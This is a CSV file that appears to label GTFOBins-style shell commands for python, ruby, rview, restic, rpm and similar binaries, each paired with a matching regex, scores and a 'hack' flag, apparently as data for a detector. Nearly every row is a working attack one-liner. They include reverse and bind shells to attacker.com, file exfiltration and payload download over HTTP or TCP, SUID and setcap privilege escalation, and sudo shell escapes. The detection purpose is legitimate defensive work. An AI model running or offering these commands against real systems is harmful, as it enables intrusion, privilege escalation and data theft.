ocode,code,word_count,match_count,match_score,hack
"python -c 'import sys,socket,os,pty;s=socket.socket()s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn(""/bin/sh"")'","python -c [\'|""]| -e [\'|""]|cat >.*<<.*import sys\,socket\,os\,pty\;[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.socket\(\)s\.connect\(\(os\.getenv\(""RHOST""\)\,int\(os\.getenv\(""RPORT""\)\)\)\)os\.dup2\(s\.fileno\(\)\,fd\) for fd in \(0\,1\,2\)pty\.spawn\(""/bin/sh""\)'",8,3,0.5529411764705883,1
export URL=http://attacker.com/,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/",2,2,1.0,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"python -c 'import sys; from os import environ as eif sys.version_info.major == 3: import urllib.request as r, urllib.parse as uelse: import urllib as u, urllib2 as rr.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))'","python -c [\'|""]| -e [\'|""]|cat >.*<<.*import sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e""URL""\, bytes\(u\.urlencode\({""d"":open\(e""LFILE""\)\.read\(\)}\)\.encode\(\)\)\)'",28,2,0.30578512396694213,0
export LPORT=8888,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.7222222222222223,0
"python -c 'import sys; from os import environ as eif sys.version_info.major == 3: import http.server as s, socketserver as sselse: import SimpleHTTPServer as s, SocketServer as ssss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()'","python -c [\'|""]| -e [\'|""]|cat >.*<<.*import sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""""\, int\(e""LPORT""\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)'",29,2,0.26744186046511625,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"python -c 'import sys; from os import environ as eif sys.version_info.major == 3: import urllib.request as relse: import urllib as rr.urlretrieve(e[""URL""], e[""LFILE""])'","python -c [\'|""]| -e [\'|""]|cat >.*<<.*import sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e""URL""\, e""LFILE""\)'",22,2,0.3515151515151515,0
"python -c 'open(""file_to_write"",""w+"").write(""DATA"")'","python -c [\'|""]| -e [\'|""]|cat >.*<<.*open\(""[\w\-_\/]+""\,""w\+""\)\.write\(""DATA""\)'",3,2,0.8867924528301887,0
"python -c 'print(open(""file_to_read"").read())'","python -c [\'|""]| -e [\'|""]|cat >.*<<.*print\(open\(""[\w\-_\/]+""\)\.read\(\)\)'",3,2,0.9787234042553191,0
"python -c 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")'","python -c [\'|""]| -e [\'|""]|cat >.*<<.*from ctypes import cdll\; cdll\.LoadLibrary\(""lib\.so""\)'",7,1,0.515625,0
sudo install -m =xs $(which python) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which python\) \.",7,1,0.7105263157894737,0
"./python -c 'import os; os.execl(""/bin/sh"", ""sh"", ""-p"")'","\./python -c [\'|""]| -e [\'|""]|cat >.*<<.*import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-p""\)'",7,1,0.6140350877192983,1
"sudo python -c 'import os; os.system(""/bin/sh"")'","sudo python -c [\'|""]| -e [\'|""]|cat >.*<<.*import os\; os\.system\(""/bin/sh""\)'",6,1,0.6530612244897959,1
cp $(which python) .,cp \$\(which python\) \.,4,0,0.19047619047619047,0
sudo setcap cap_setuid+ep python,sudo setcap cap_setuid\+ep python,4,0,0.030303030303030304,0
"./python -c 'import os; os.setuid(0); os.system(""/bin/sh"")'","\./python -c [\'|""]| -e [\'|""]|cat >.*<<.*import os\; os\.setuid\(0\)\; os\.system\(""/bin/sh""\)'",6,1,0.6166666666666667,1
rake -p '`/bin/sh 1>&0`',rake -p '`/bin/sh 1>&0`',4,0,0.0,1
sudo rake -p '`/bin/sh 1>&0`',sudo rake -p '`/bin/sh 1>&0`',5,0,0.0,1
sudo install -m =xs $(which rake) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which rake\) \.",7,1,0.75,0
./rake -p '`/bin/sh 1>&0`',\./rake -p '`/bin/sh 1>&0`',4,0,0.037037037037037035,1
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
readelf -a @$LFILE,readelf -a @\$LFILE,3,0,0.05263157894736842,0
sudo install -m =xs $(which readelf) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which readelf\) \.",7,1,0.6923076923076923,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./readelf -a @$LFILE,\./readelf -a @\$LFILE,3,0,0.09523809523809523,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo readelf -a @$LFILE,sudo readelf -a @\$LFILE,4,0,0.041666666666666664,0
red file_to_write,red [\w\-_\/]+,2,1,0.6666666666666666,0
a,a,1,0,0.0,0
DATA,DATA,1,0,0.0,0
.,\.,1,0,0.5,0
w,w,1,0,0.0,0
q,q,1,0,0.0,0
red file_to_read,red [\w\-_\/]+,2,1,0.6470588235294118,0
",p","\,p",1,0,0.3333333333333333,0
q,q,1,0,0.0,0
sudo red file_to_write,sudo red [\w\-_\/]+,3,1,0.5217391304347826,0
a,a,1,0,0.0,0
DATA,DATA,1,0,0.0,0
.,\.,1,0,0.5,0
w,w,1,0,0.0,0
q,q,1,0,0.0,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"redcarpet ""$LFILE""","redcarpet ""\$LFILE""",2,0,0.05263157894736842,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"sudo redcarpet ""$LFILE""","sudo redcarpet ""\$LFILE""",3,0,0.041666666666666664,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
NAME=backup_name,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.7058823529411764,0
"./rest-server --listen "":$RPORT""","\./rest-server --listen "":\$RPORT""",3,0,0.06060606060606061,0
"restic init -r ""rest:http://localhost:$RPORT/$NAME""","restic init -r ""rest:http://localhost:\$RPORT/\$NAME""",4,0,0.038461538461538464,0
"restic restore -r ""/tmp/restic/$NAME"" latest --target .","restic restore -r ""/tmp/restic/\$NAME"" latest --target \.",7,0,0.03571428571428571,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_or_dir_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.2,0
NAME=backup_name,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.7058823529411764,0
"restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","restic backup -r ""rest:http://\$RHOST:\$RPORT/\$NAME"" ""\$LFILE""",5,0,0.06666666666666667,0
sudo install -m =xs $(which restic) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which restic\) \.",7,1,0.7105263157894737,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_or_dir_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.2,0
NAME=backup_name,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.7058823529411764,0
"./restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","\./restic backup -r ""rest:http://\$RHOST:\$RPORT/\$NAME"" ""\$LFILE""",5,0,0.08064516129032258,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_or_dir_to_get,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.2,0
NAME=backup_name,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.7058823529411764,0
"sudo restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE""","sudo restic backup -r ""rest:http://\$RHOST:\$RPORT/\$NAME"" ""\$LFILE""",6,0,0.06153846153846154,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
rev $LFILE | rev,rev \$LFILE \| rev,4,0,0.11764705882352941,0
sudo install -m =xs $(which rev) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which rev\) \.",7,1,0.7714285714285715,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
./rev $LFILE | rev,\./rev \$LFILE \| rev,4,0,0.15789473684210525,0
LFILE=file_to_read,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
sudo rev $LFILE | rev,sudo rev \$LFILE \| rev,5,0,0.09090909090909091,0
RHOST=attacker.com,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",1,2,1.631578947368421,0
RPORT=12345,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,2.5833333333333335,0
LFILE=file_to_send,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.5789473684210527,0
"rlogin -l ""$(cat $LFILE)"" -p $RPORT $RHOST","rlogin -l ""\$\(cat \$LFILE\)"" -p \$RPORT \$RHOST",7,0,0.13953488372093023,0
rlwrap /bin/sh,rlwrap /bin/sh,2,0,0.0,1
LFILE=file_to_write,"[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",1,2,1.55,0
"rlwrap -l ""$LFILE"" echo DATA","rlwrap -l ""\$LFILE"" echo DATA",5,0,0.034482758620689655,0
sudo install -m =xs $(which rlwrap) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which rlwrap\) \.",7,1,0.7105263157894737,0
./rlwrap -H /dev/null /bin/sh -p,\./rlwrap -H /dev/null /bin/sh -p,5,0,0.030303030303030304,1
sudo rlwrap /bin/sh,sudo rlwrap /bin/sh,3,0,0.0,1
"rpm --eval '%{lua:os.execute(""/bin/sh"")}'","rpm --eval '%{lua:os\.execute\(""/bin/sh""\)}'",3,0,0.07142857142857142,1
"sudo rpm --eval '%{lua:os.execute(""/bin/sh"")}'","sudo rpm --eval '%{lua:os\.execute\(""/bin/sh""\)}'",4,0,0.06382978723404255,1
TF=$(mktemp -d),[\w\-_]+=\$\(mktemp -d\),2,1,0.6875,0
echo 'id' > $TF/x.sh,echo 'id' > \$TF/x\.sh,4,0,0.09523809523809523,0
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF,fpm -n x -s dir -t rpm -a all --before-install \$TF/x\.sh \$TF,12,0,0.05,0
sudo rpm -ivh x-1.0-1.noarch.rpm,sudo rpm -ivh x-1\.0-1\.noarch\.rpm,4,0,0.09090909090909091,0
sudo install -m =xs $(which rpm) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which rpm\) \.",7,1,0.7714285714285715,0
"./rpm --eval '%{lua:os.execute(""/bin/sh"")}'","\./rpm --eval '%{lua:os\.execute\(""/bin/sh""\)}'",3,0,0.09090909090909091,1
"rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","rpmquery --eval '%{lua:posix\.exec\(""/bin/sh""\)}'",3,0,0.06382978723404255,1
"sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'","sudo rpmquery --eval '%{lua:posix\.exec\(""/bin/sh""\)}'",4,0,0.057692307692307696,1
sudo install -m =xs $(which rpmquery) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which rpmquery\) \.",7,1,0.675,0
"./rpmquery --eval '%{lua:os.execute(""/bin/sh"")}'","\./rpmquery --eval '%{lua:os\.execute\(""/bin/sh""\)}'",3,0,0.08163265306122448,1
"rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","rsync -c [\'|""]| -e [\'|""]|cat >.*<<.*sh -c [\'|""]| -e [\'|""]|cat >.*<<.*sh 0<&2 1>&2""' 127\.0\.0\.1:/dev/null",8,2,1.1346153846153846,0
sudo install -m =xs $(which rsync) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which rsync\) \.",7,1,0.7297297297297297,0
"./rsync -e 'sh -p -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","\./rsync -c [\'|""]| -e [\'|""]|cat >.*<<.*sh -p -c [\'|""]| -e [\'|""]|cat >.*<<.*sh 0<&2 1>&2""' 127\.0\.0\.1:/dev/null",9,2,1.0526315789473684,0
"sudo rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null","sudo rsync -c [\'|""]| -e [\'|""]|cat >.*<<.*sh -c [\'|""]| -e [\'|""]|cat >.*<<.*sh 0<&2 1>&2""' 127\.0\.0\.1:/dev/null",9,2,1.0350877192982457,0
"ruby -e 'exec ""/bin/sh""'","ruby -c [\'|""]| -e [\'|""]|cat >.*<<.*exec ""/bin/sh""'",4,1,1.12,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[""RHOST""],ENV[""RPORT""]);while(cmd=c.gets);IO.popen(cmd,""r""){|io|c.print io.read}end'","ruby -rsocket -c [\'|""]| -e [\'|""]|cat >.*<<.*exit if fork\;[\w\-_]+=TCPSocket\.new\(ENV""RHOST""\,ENV""RPORT""\)\;while\([\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.gets\)\;IO\.popen\(cmd\,""r""\){\|io\|c\.print io\.read}end'",7,4,0.648854961832061,0
export LPORT=8888,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.7222222222222223,0
ruby -run -e httpd . -p $LPORT,ruby -run -e httpd \. -p \$LPORT,7,0,0.06451612903225806,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"ruby -e 'require ""open-uri""; download = open(ENV[""URL""]); IO.copy_stream(download, ENV[""LFILE""])'","ruby -c [\'|""]| -e [\'|""]|cat >.*<<.*require ""open-uri""\; download =[ a-z0-9\.\-\/\'\""_\@]+\(ENV""URL""\)\; IO\.copy_stream\(download\, ENV""LFILE""\)'",9,2,0.6170212765957447,0
"ruby -e 'File.open(""file_to_write"", ""w+"") { |f| f.write(""DATA"") }'","ruby -c [\'|""]| -e [\'|""]|cat >.*<<.*File\.open\(""[\w\-_\/]+""\, ""w\+""\) { \|f\| f\.write\(""DATA""\) }'",8,2,0.746268656716418,0
"ruby -e 'puts File.read(""file_to_read"")'","ruby -c [\'|""]| -e [\'|""]|cat >.*<<.*puts File\.read\(""[\w\-_\/]+""\)'",4,2,1.024390243902439,0
"ruby -e 'require ""fiddle""; Fiddle.dlopen(""lib.so"")'","ruby -c [\'|""]| -e [\'|""]|cat >.*<<.*require ""fiddle""\; Fiddle\.dlopen\(""lib\.so""\)'",5,1,0.6346153846153846,0
"sudo ruby -e 'exec ""/bin/sh""'","sudo ruby -c [\'|""]| -e [\'|""]|cat >.*<<.*exec ""/bin/sh""'",5,1,0.9333333333333333,1
cp $(which ruby) .,cp \$\(which ruby\) \.,4,0,0.21052631578947367,0
sudo setcap cap_setuid+ep ruby,sudo setcap cap_setuid\+ep ruby,4,0,0.03225806451612903,0
"./ruby -e 'Process::Sys.setuid(0); exec ""/bin/sh""'","\./ruby -c [\'|""]| -e [\'|""]|cat >.*<<.*Process::Sys\.setuid\(0\)\; exec ""/bin/sh""'",5,1,0.6470588235294118,1
run-mailcap --action=view /etc/hosts,"run-mailcap [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",3,2,0.8108108108108109,0
!/bin/sh,!/bin/sh,1,0,0.0,1
run-mailcap --action=edit file_to_read,"run-mailcap [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",3,2,0.7692307692307693,0
run-mailcap --action=view file_to_read,"run-mailcap [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",3,2,0.7692307692307693,0
sudo run-mailcap --action=view /etc/hosts,"sudo run-mailcap [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",4,2,0.7142857142857143,0
!/bin/sh,!/bin/sh,1,0,0.0,1
run-parts --new-session --regex '^sh$' /bin,run-parts --new-session --regex '\^sh\$' /bin,5,0,0.045454545454545456,0
sudo install -m =xs $(which run-parts) .,"sudo install -m =[ a-z0-9\.\-\/\'\""_\@]+\$\(which run-parts\) \.",7,1,0.6585365853658537,0
./run-parts --new-session --regex '^sh$' /bin --arg='-p',"\./run-parts --new-session --regex '\^sh\$' /bin [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",6,2,0.543859649122807,0
sudo run-parts --new-session --regex '^sh$' /bin,sudo run-parts --new-session --regex '\^sh\$' /bin,6,0,0.04081632653061224,0
"rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'","rview -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import os\; os\.execl\(""/bin/sh""\, ""sh""\, ""-c""\, ""reset\; exec sh""\)'",11,1,0.47368421052631576,1
"rview -c ':lua os.execute(""reset; exec sh"")'","rview -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua os\.execute\(""reset\; exec sh""\)'",6,1,0.7111111111111111,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"rview -c ':py import vim,sys,socket,os,pty;s=socket.socket()s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))[os.dup2(s.fileno(),fd) for fd in (0,1,2)]pty.spawn(""/bin/sh"")vim.command("":q!"")'","rview -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\,socket\,os\,pty\;[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.socket\(\)s\.connect\(\(os\.getenv\(""RHOST""\)\,int\(os\.getenv\(""RPORT""\)\)\)\)os\.dup2\(s\.fileno\(\)\,fd\) for fd in \(0\,1\,2\)pty\.spawn\(""/bin/sh""\)vim\.command\("":q!""\)'",9,3,0.5025641025641026,1
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"rview -c ':lua local s=require(""socket""); local t=assert(s.tcp());  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));  while true do    local r,x=t:receive();local f=assert(io.popen(r,""r""));    local b=assert(f:read(""*a""));t:send(b);  end;  f:close();t:close();'","rview -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\; local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\(""RHOST""\)\,os\.getenv\(""RPORT""\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(io\.popen\(r\,""r""\)\)\;    local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(f:read\(""\*a""\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'",28,11,0.8593155893536122,0
export LPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
"rview -c ':lua local k=require(""socket"");  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));  local c=s:accept();  while true do    local r,x=c:receive();local f=assert(io.popen(r,""r""));    local b=assert(f:read(""*a""));c:send(b);  end;c:close();f:close();'","rview -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(k\.bind\(""\*""\,os\.getenv\(""LPORT""\)\)\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(io\.popen\(r\,""r""\)\)\;    local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(f:read\(""\*a""\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'",28,13,1.0,0
export URL=http://attacker.com/,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/",2,2,1.0,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"rview -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import urllib.request as r, urllib.parse as uelse: import urllib as u, urllib2 as rr.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))vim.command("":q!"")'","rview -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e""URL""\, bytes\(u\.urlencode\({""d"":open\(e""LFILE""\)\.read\(\)}\)\.encode\(\)\)\)vim\.command\("":q!""\)'",29,2,0.29213483146067415,0
export LPORT=8888,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.7222222222222223,0
"rview -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import http.server as s, socketserver as sselse: import SimpleHTTPServer as s, SocketServer as ssss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()vim.command("":q!"")'","rview -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""""\, int\(e""LPORT""\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)vim\.command\("":q!""\)'",30,2,0.2579505300353357,0
export RHOST=attacker.com,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.com",2,2,1.1923076923076923,0
export RPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_send,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"rview -c ':lua local f=io.open(os.getenv(""LFILE""), 'rb')  local d=f:read(""*a"")  io.close(f);  local s=require(""socket"");  local t=assert(s.tcp());  t:connect(os.getenv(""RHOST""),os.getenv(""RPORT""));  t:send(d);  t:close();'","rview -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(os\.getenv\(""LFILE""\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:read\(""\*a""\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\(""RHOST""\)\,os\.getenv\(""RPORT""\)\)\;  t:send\(d\)\;  t:close\(\)\;'",23,9,0.852017937219731,0
export URL=http://attacker.com/file_to_get,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+://attacker\.com/[\w\-_\/]+",2,3,1.0,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"rview -c ':py import vim,sys; from os import environ as eif sys.version_info.major == 3: import urllib.request as relse: import urllib as rr.urlretrieve(e[""URL""], e[""LFILE""])vim.command("":q!"")'","rview -c [\'|""]| -e [\'|""]|cat >.*<<.*:py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9\.\-\/\'\""_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e""URL""\, e""LFILE""\)vim\.command\("":q!""\)'",23,2,0.3263157894736842,0
export LPORT=12345,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.631578947368421,0
export LFILE=file_to_save,"export [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+",2,2,1.1538461538461537,0
"rview -c ':lua local k=require(""socket"");  local s=assert(k.bind(""*"",os.getenv(""LPORT"")));  local c=s:accept();  local d,x=c:receive(""*a"");  c:close();  local f=io.open(os.getenv(""LFILE""), ""wb"");  f:write(d);  io.close(f);'","rview -c [\'|""]| -e [\'|""]|cat >.*<<.*:lua local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(""socket""\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\(k\.bind\(""\*""\,os\.getenv\(""LPORT""\)\)\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+:receive\(""\*a""\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9\.\-\/\'\""_\@]+\.open\(os\.getenv\(""LFILE""\)\, ""wb""\)\;  f:write\(d\)\;  io\.close\(f\)\;'",24,11,0.9910714285714286,0
rview file_to_write,rview [\w\-_\/]+,2,1,0.6,0
iDATA,iDATA,1,0,0.0,0
w!,w!,1,0,0.0,0
rview file_to_read,rview [\w\-_\/]+,2,1,0.5789473684210527,0
